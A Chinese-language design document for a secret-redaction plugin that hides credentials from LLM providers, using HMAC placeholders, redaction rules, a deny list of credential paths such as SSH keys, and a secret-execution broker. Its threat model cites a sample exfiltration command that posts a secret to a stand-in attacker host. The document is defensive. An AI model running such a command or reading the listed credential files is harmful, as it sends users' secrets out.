# DESIGN.md — dsh-vibeguard 设计

本文记录持久的设计决策;与代码冲突时以代码为准。

## 威胁模型

本机可信(日志明文可接受),LLM 提供商与遥测后端不可信(出境即泄露,提供商可能留存)。安全目标单一:**原始秘密永远不出境**。参考 vibeguard(Legit Security)与 opencode-vibeguard 的非对称视图(用户看真值、LLM 看占位符)。

## 为什么脱敏必须在写日志之前

DSH 把"发给 LLM 的请求"定义为**会话日志的纯函数**,且在 `llm/stream` / `agent/request` 钩子上深冻结——契约明确"listeners read it, never rewrite it"。opencode-vibeguard 那种"本地存明文、每请求出站前重扫脱敏"的架构在 DSH 里不存在挂点。因此脱敏边界前移:**凡写入会话日志的入口**(工具结果 `tools/post-execute`、用户消息 `agent/pre-step`、run_code 子调用日志 `tools/code-dispatch-log`)先替换再提交。日志即占位符,之后所有请求/重试/replay/会话恢复/subagent fork 自动继承干净内容,脱敏一次永久生效。

代价:本地 transcript 里也是占位符。在"本机可信"模型下这是可接受的——查真值走 map.jsonl;顺带日志被分享/上传时天然脱敏。

## 为什么不做运行期还原

`PreToolDecision` 只有 allow/deny/ask,契约明确"Input rewriting is excluded because arguments are already logged and presented",参数在 pre-execute 前深冻结。绕过深冻结是对抗框架(脆弱且随版本漂移)。vibeguard 的"执行前还原参数"在 DSH 公开 API 里无等价物,故不做。模型侧由系统提示词引导:需真值时请用户提供,或用 env 间接引用(`$VAR` 由 shell 在执行时展开,秘密不进上下文)。

## 占位符:内容寻址

`__REDACTED_<NAME>_<hmac12>__`,hmac12 = HMAC-SHA256(per-install 本机密钥, 原文) 前 12 位 hex。

- **纯函数、零上下文**:不依赖会话/env/计数器。同一秘密跨会话、跨重启同占位符,去重与相等性语义免费;脱敏路径纯计算零 I/O;映射存储得以是全局单文件(按会话分片失去意义)。
- **HMAC 而非裸哈希**:占位符发给不可信的 LLM 提供商;低熵秘密(弱密码类 kv 命中)的裸哈希可被离线字典爆破验证,HMAC 密钥不出本机则连验证都做不到。SHA-256 是无聊但标准的选择;真正的安全参数是 48 bit 截断(生日界 ~2^24 个秘密)与 HMAC 密钥。
- **碰撞**:同占位符撞不同原文时追加 `_2`/`_3` 后缀(VibeGuard 同策略),后缀在 `__` 之前,查找正则容忍 `(?:_\d+)?`。
- **NAME**:有序规则表首条命中生效,规则名即类别(`[A-Z0-9_]{2,24}`,zod 校验,非法配置挂载即报错,不静默降级)。完整单词名而非短码——占位符的读者是用户和模型,自解释优先。NAME 标识秘密的**类别**,不标识来源工具或编码;私钥按 armor 形态拆成 `OPENSSH_PRIVATE_KEY`/`PGP_PRIVATE_KEY`/`GENERIC_PEM_PRIVATE_KEY` 三条,因为整个 BEGIN 行被脱敏后,笼统的 `PRIVATE_KEY` 会把形态信息抹掉。兜底前缀统一用 `GENERIC_`("无特定归属的剩余项";`GENERAL` 是"总体的",语义不对)。
- **不带 DSH 前缀**:`__REDACTED_` + NAME + 12hex 的组合在自然文本中出现概率为零,品牌前缀无防碰撞价值,去掉对模型更自解释。
- **无原文前缀**:占位符文本会出境,任何前缀都是泄露。区分"新旧 key"这类需求由 hash 的稳定身份承担,不由原文片段承担。

## 规则集

内置规则 = gitleaks 默认集(222 条)+ opencode-vibeguard 配置的校准子集,改写为 JS RegExp(RE2 方言不兼容)。收录原则:结构性前缀规则优先(前缀即身份,误报天然低);关键词锚定规则不收(扫的是 agent 文本不是仓库);通用 kv 规则以 `group` 只脱敏值 + `minLength` 降噪收尾,可按名关。用户规则排在内置之前,可用更具体的 pattern 截胡宽泛内置规则。

两处相对上游的修正:私钥规则吃到 `-----END-----`(vibeguard 只匹配头行,正文会漏);通用 `sk-` 规则允许 dash(`sk-kimi-…` 形态,vibeguard 的写法会漏)。幂等性由引擎保证:已是占位符的值跳过(kv 规则会把占位符当值二次脱敏)。

**PII 是可选层,默认关闭**(`enabledOptionalRules` 按名启用):PII 与凭据的风险类别不同——长数字 pattern 在编码语境误报率高(时间戳/随机 ID),脱敏又不可还原,若这类数据正是工作内容则全开等于自残。`PII_CN_ID` 用 regex 圈定形态后由 GB 11643 校验位二次验证(随机数字通过率 ~1/11,再叠加日期段合法性,精度接近凭据级);为此引擎支持内置规则携带 `validate` 函数(loader config 是纯 JSON 给不了函数,validate 只存在于内置规则)。`PII_CN_PHONE` 纯 regex。邮箱不收(git log 每条提交都带,误报无药可救)。

## 存储

`~/.dsh/redaction/`(0700):`key`(0600,首运行生成,权限漂移自动修正)、`map.jsonl`(0600,append-only)。不依赖 umask,创建显式传 mode。增长只随不同秘密数量;不淘汰,清理 = 手动删行;加载容忍坏行。映射只服务用户查询,运行时正确性不依赖它。

## 访问控制(tools/pre-execute,src/guard.ts)

deny 匹配是**字段感知**的:只检查各工具的"目标"参数(`command`/`file_path`/`path`/`workdir`/`cwd`/`directory` 等),不对整个参数 JSON 做子串匹配。初版的全 JSON 匹配在实践中立刻误伤——编辑 README 时 new_string 提到 deny 路径字样即被拦;真正的访问语义在目标参数里。目录条目(尾斜杠)对"引用目录本身"的写法用 `value + '/'` 归一匹配,不扩大到兄弟路径。

固有局限(有意的取舍):bash 命令是自由文本,`cat $X`、`cd … && cat …` 这类拼接可绕过子串匹配。deny 防的是"agent 顺手把凭据文件(`~/.dsh/.credentials.yaml`、`~/.dsh/redaction/`、`~/.ssh/id_*` 等,可配置)读进上下文",不是对抗性绕过;真正的兜底仍是 post-execute 脱敏。访问控制对本插件自身的映射文件尤其重要:否则 map.jsonl 会被读进上下文再脱敏成占位符,等于把明文表拱手相送。

## broker 工具:secret_exec(src/broker.ts)

### 为什么不能 hook bash

DSH 工具参数的生命周期:模型发出调用 → 参数先写持久日志+呈现审批界面 → 深冻结 → 才轮到插件钩子。`tools/pre-execute` 只有 allow/deny/ask;`tools/execute` 的 `next()` 不接受参数。改写已落账参数会让日志与审批界面撒谎(reconstructability 不变量),所以该通道在架构上不存在,不是没开放。绕过深冻结或替换官方 bash 行分别是"对抗框架"和"重写整个工具",均不可取。

### 设计

还原做成 secret_exec 的**声明语义**:命令带占位符落日志(干净、可审计),工具实现从映射查真值、在子进程内存里替换、spawn 执行,输出先把用过的真值换回占位符(不依赖规则命中)再过引擎。未知占位符拒绝执行并提示向用户要值。子进程环境复刻 dsh-subprocess 的 scrub(`/KEY|PASSWORD|SECRET|TOKEN/i` + `DSH_` 前缀不下发)——实测 bash 工具的子进程环境已被 harness 剥掉凭据形状变量,`$ENV_VAR` 式间接引用在 DSH 里默认是断的,broker 因此是"用真值执行"的唯一出口。

### 威胁语义

- 真值全程不进上下文、不进日志,只存在于子进程内存;审批界面看到的是占位符命令。
- 模型可构造外发命令(curl -d <secret> evil.com)——与"用户直接告知密码"同级风险,用 `secretExec.requireApproval`(默认 true,走 DSH 审批流)把人放进环路;approval 策略 never 时自动拒绝。
- 审计链 = 日志占位符命令 + map.jsonl(仅用户可读,broker 内部读不走工具管道、不受 deny 影响)。
- map.jsonl 由此从"审计副产物"升格为 broker 的权威真值源,重启后加载即恢复还原能力。

## 工程

- rolldown 两产物:`dist/index.js`(host ESM,zod 外置)、`dist/core.js`(纯逻辑,Node 测试 import)。
- **dist 不进 git**:安装走本地 link(开发)或 npm scoped 包(发布,`prepack` 构建);不经过 github: 通道,因此不需要 stats-compact 的"dist 提交进 git"妥协。
- 无 client 半(显示还原已论证为净损失:看到真值信息量为零,暴露面为实)。
